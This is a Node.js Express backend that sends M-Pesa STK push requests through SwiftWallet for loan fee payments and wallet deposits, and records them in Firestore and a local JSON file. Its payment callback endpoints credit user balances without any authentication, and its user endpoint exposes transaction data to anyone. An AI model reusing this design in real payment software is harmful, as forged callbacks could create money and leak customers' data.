// server.js
const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");
const fs = require("fs");
const path = require("path");
const admin = require("firebase-admin");

const app = express();
const PORT = process.env.PORT || 3000;

// -----------------------------
// Firestore / Admin setup
// -----------------------------
function initFirebaseAdmin() {
  try {
    const projectId = process.env.FIREBASE_PROJECT_ID;
    const clientEmail = process.env.FIREBASE_CLIENT_EMAIL;
    let privateKey = process.env.FIREBASE_PRIVATE_KEY;

    if (projectId && clientEmail && privateKey) {
      privateKey = privateKey.includes("\\n") ? privateKey.replace(/\\n/g, "\n") : privateKey;
      admin.initializeApp({
        credential: admin.credential.cert({
          projectId,
          clientEmail,
          privateKey,
        }),
      });
      console.log("✅ Firebase Admin initialized from environment variables.");
      return;
    }
  } catch (err) {
    console.warn("⚠️ Firebase env init failed:", err.message);
  }

  const localKeyPath = path.join(__dirname, "serviceAccountKey.json");
  if (fs.existsSync(localKeyPath)) {
    const serviceAccount = require(localKeyPath);
    admin.initializeApp({
      credential: admin.credential.cert(serviceAccount),
    });
    console.log("✅ Firebase Admin initialized from local serviceAccountKey.json.");
    return;
  }

  console.error("❌ Firebase Admin initialization failed — no credentials found.");
  process.exit(1);
}

initFirebaseAdmin();
const db = admin.firestore();

// -----------------------------
// Middleware
// -----------------------------
app.use(bodyParser.json());
const FRONTEND_ORIGIN = process.env.FRONTEND_ORIGIN || "https://balancesystemfrontend.onrender.com";
app.use(
  cors({
    origin: FRONTEND_ORIGIN,
    methods: ["GET", "POST", "OPTIONS"],
  })
);

// -----------------------------
// Helpers
// -----------------------------
function formatPhone(phone) {
  if (!phone) return null;
  const digits = String(phone).replace(/\D/g, "");
  if (digits.length === 9 && digits.startsWith("7")) return "254" + digits;
  if (digits.length === 10 && digits.startsWith("07")) return "254" + digits.substring(1);
  if (digits.length === 12 && digits.startsWith("254")) return digits;
  return null;
}

function swiftWalletHeaders() {
  const token = process.env.SWIFTWALLET_API_KEY;
  if (!token) throw new Error("SWIFTWALLET_API_KEY not set in environment");
  return {
    Authorization: `Bearer ${token}`,
    "Content-Type": "application/json",
  };
}

function axiosErrorToObject(err) {
  if (!err) return { message: "Unknown error" };
  return {
    message: err.message,
    status: err.response?.status || null,
    data: err.response?.data || null,
  };
}

// -----------------------------
// Routes
// -----------------------------

// 1️⃣ /pay (loan payments)
app.post("/pay", async (req, res) => {
  try {
    const { phone, amount, loan_amount } = req.body;
    const formattedPhone = formatPhone(phone);
    if (!formattedPhone) return res.status(400).json({ success: false, error: "Invalid phone" });
    if (!amount || amount < 1) return res.status(400).json({ success: false, error: "Amount must be >= 1" });

    const reference = "ORDER-" + Date.now();
    const payload = {
      amount: Math.round(amount),
      phone_number: formattedPhone,
      external_reference: reference,
      customer_name: "Customer",
      callback_url: `${process.env.BACKEND_PUBLIC_URL || "https://balancesystembackend.onrender.com"}/callback`,
      channel_id: "000205",
    };

    const url = "https://swiftwallet.co.ke/pay-app-v2/payments.php";
    console.log("📤 /pay -> sending to SwiftWallet", payload);

    let resp;
    try {
      resp = await axios.post(url, payload, { headers: swiftWalletHeaders() });
      console.log("📥 SwiftWallet /pay response:", resp.data);
    } catch (err) {
      const e = axiosErrorToObject(err);
      console.error("❌ SwiftWallet /pay error:", e);
      return res.status(502).json({ success: false, error: "STK push failed", details: e });
    }

    if (resp.data && resp.data.success) {
      const receiptsFile = path.join(__dirname, "receipts.json");
      let receipts = {};
      if (fs.existsSync(receiptsFile)) {
        try {
          receipts = JSON.parse(fs.readFileSync(receiptsFile));
        } catch {
          receipts = {};
        }
      }
      const receiptData = {
        reference,
        transaction_id: resp.data.transaction_id || null,
        amount: Math.round(amount),
        loan_amount: loan_amount || "50000",
        phone: formattedPhone,
        status: "pending",
        status_note: `STK push sent to ${formattedPhone}`,
        timestamp: new Date().toISOString(),
      };
      receipts[reference] = receiptData;
      fs.writeFileSync(receiptsFile, JSON.stringify(receipts, null, 2));
      return res.json({ success: true, message: "STK push sent", reference, receipt: receiptData });
    } else {
      console.warn("/pay -> SwiftWallet responded with success=false", resp.data);
      return res.status(400).json({ success: false, error: resp.data || "STK push failed" });
    }
  } catch (err) {
    console.error("Payment error:", err);
    return res.status(500).json({ error: "Payment failed", details: err.message });
  }
});

// 2️⃣ /callback (loan payments callback)
app.post("/callback", async (req, res) => {
  try {
    const data = req.body;
    console.log("📩 /callback received:", data);

    const ref = data.external_reference;
    const receiptsFile = path.join(__dirname, "receipts.json");
    let receipts = {};
    if (fs.existsSync(receiptsFile)) {
      try {
        receipts = JSON.parse(fs.readFileSync(receiptsFile));
      } catch {
        receipts = {};
      }
    }
    const existingReceipt = receipts[ref] || {};
    const status = (data.status || "").toLowerCase();
    const resultCode = data.result?.ResultCode;

    const customerName =
      data.result?.Name ||
      [data.result?.FirstName, data.result?.MiddleName, data.result?.LastName].filter(Boolean).join(" ") ||
      existingReceipt.customer_name ||
      "N/A";

    if ((status === "completed" && data.success === true) || resultCode === 0) {
      receipts[ref] = {
        ...existingReceipt,
        reference: ref,
        transaction_id: data.transaction_id,
        transaction_code: data.result?.MpesaReceiptNumber || null,
        amount: data.result?.Amount || existingReceipt.amount,
        loan_amount: existingReceipt.loan_amount || "50000",
        phone: data.result?.Phone || existingReceipt.phone,
        customer_name: customerName,
        status: "processing",
        status_note: `✅ Fee payment verified for ${customerName}.`,
        timestamp: new Date().toISOString(),
      };
    } else {
      let statusNote = data.result?.ResultDesc || "Payment failed or cancelled.";
      switch (data.result?.ResultCode) {
        case 1032:
          statusNote = "You cancelled the payment request.";
          break;
        case 1037:
          statusNote = "Timeout — no PIN entered.";
          break;
        case 2001:
          statusNote = "Insufficient balance.";
          break;
      }
      receipts[ref] = {
        reference: ref,
        transaction_id: data.transaction_id,
        transaction_code: null,
        amount: data.result?.Amount || existingReceipt.amount || null,
        phone: data.result?.Phone || existingReceipt.phone || null,
        customer_name: customerName,
        status: "cancelled",
        status_note: statusNote,
        timestamp: new Date().toISOString(),
      };
    }
    fs.writeFileSync(receiptsFile, JSON.stringify(receipts, null, 2));
    return res.json({ ResultCode: 0, ResultDesc: "Success" });
  } catch (err) {
    console.error("/callback error:", err);
    return res.status(500).json({ error: "Callback handling failed", details: err.message });
  }
});

// 3️⃣ /deposit (SwiftWallet v3)
app.post("/deposit", async (req, res) => {
  try {
    const { userId, phone, amount } = req.body;
    if (!userId) return res.status(400).json({ error: "userId is required" });

    const formattedPhone = formatPhone(phone);
    if (!formattedPhone) return res.status(400).json({ error: "Invalid phone" });
    if (!amount || amount < 1) return res.status(400).json({ error: "Amount must be >= 1" });

    const reference = "DEPOSIT-" + Date.now();
    const payload = {
      action: "deposit",
      wallet_type: "payments",
      phone_number: formattedPhone,
      amount: Math.round(amount),
      user_callback_url: `${process.env.BACKEND_PUBLIC_URL || "https://balancesystembackend.onrender.com"}/deposit-callback`,
    };

    const url = "https://swiftwallet.co.ke/pay-app/v3/wallet/";

    console.log("📤 /deposit sending to SwiftWallet", payload);

    let resp;
    try {
      resp = await axios.post(url, payload, { headers: swiftWalletHeaders(), timeout: 20000 });
      console.log("📥 SwiftWallet /deposit response:", resp.data);
    } catch (err) {
      const e = axiosErrorToObject(err);
      console.error("❌ SwiftWallet /deposit error:", e);
      await db.collection("deposits").doc(reference).set({
        userId,
        phone: formattedPhone,
        amount: Math.round(amount),
        reference,
        status: "error",
        note: "Failed to initiate STK push: " + (e.data?.message || e.message),
        raw_error: e,
        timestamp: admin.firestore.FieldValue.serverTimestamp(),
      });
      return res.status(502).json({ success: false, error: "Deposit initiation failed", details: e });
    }

    await db.collection("deposits").doc(reference).set({
      userId,
      phone: formattedPhone,
      amount: Math.round(amount),
      reference,
      status: "pending",
      note: "STK push sent. Check your phone.",
      swift_response: resp.data || null,
      timestamp: admin.firestore.FieldValue.serverTimestamp(),
    });

    return res.json({
      success: true,
      reference,
      message: "STK push sent. Check your phone.",
      swift_response: resp.data,
    });
  } catch (err) {
    console.error("Deposit initiation error:", err);
    return res.status(500).json({ error: "Deposit failed.", details: err.message });
  }
});

// 4️⃣ /deposit-callback
app.post("/deposit-callback", async (req, res) => {
  try {
    const data = req.body;
    console.log("📩 /deposit-callback received:", JSON.stringify(data).slice(0, 2000));

    const ref = data.external_reference;
    if (!ref) return res.status(400).json({ error: "external_reference missing" });

    const resultCode = data.result?.ResultCode;
    const success = (data.status === "completed" && data.success === true) || resultCode === 0;

    let depositStatus = "failed";
    let note = "Deposit failed.";
    if (success) {
      depositStatus = "success";
      note = "Deposit successful.";
    } else if (resultCode === 1032) {
      depositStatus = "cancelled";
      note = "Deposit cancelled.";
    } else if (resultCode === 1037) {
      depositStatus = "timeout";
      note = "Deposit timed out.";
    } else {
      note = data.result?.ResultDesc || note;
    }

    const depositRef = db.collection("deposits").doc(ref);
    const depositSnap = await depositRef.get();
    if (!depositSnap.exists) return res.status(404).json({ error: "Reference not found" });

    const depositData = depositSnap.data();
    await depositRef.update({
      status: depositStatus,
      note,
      swift_callback: data,
      updatedAt: admin.firestore.FieldValue.serverTimestamp(),
    });

    if (depositStatus === "success") {
      const userRef = db.collection("users").doc(depositData.userId);
      const userSnap = await userRef.get();
      const currentBalance = userSnap.exists ? userSnap.data().balance || 0 : 0;
      await userRef.set(
        {
          balance: currentBalance + (depositData.amount || 0),
          lastDeposit: depositData.amount || 0,
          updatedAt: admin.firestore.FieldValue.serverTimestamp(),
        },
        { merge: true }
      );
      console.log(`✅ Balance updated for user ${depositData.userId}: +${depositData.amount}`);
    } else {
      console.log(`⚠️ Deposit ${ref} status updated to ${depositStatus}: ${note}`);
    }

    return res.json({ ResultCode: 0, ResultDesc: "Deposit callback handled successfully" });
  } catch (err) {
    console.error("/deposit-callback error:", err);
    return res.status(500).json({ error: "Callback handling failed", details: err.message });
  }
});

// 5️⃣ /user/:userId
app.get("/user/:userId", async (req, res) => {
  try {
    const { userId } = req.params;
    if (!userId) return res.status(400).json({ error: "userId required" });

    const userSnap = await db.collection("users").doc(userId).get();
    const balance = userSnap.exists ? userSnap.data().balance || 0 : 0;

    const depositsSnap = await db
      .collection("deposits")
      .where("userId", "==", userId)
      .orderBy("timestamp", "desc")
      .limit(200)
      .get();

    const transactions = depositsSnap.docs.map((d) => ({ id: d.id, ...d.data() }));
    return res.json({ balance, transactions });
  } catch (err) {
    console.error("/user/:userId error:", err);
    return res.status(500).json({ error: "Failed to fetch user data", details: err.message });
  }
});

// Health check
app.get("/", (req, res) => res.send({ ok: true, ts: new Date().toISOString() }));

// 🚀 Start
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
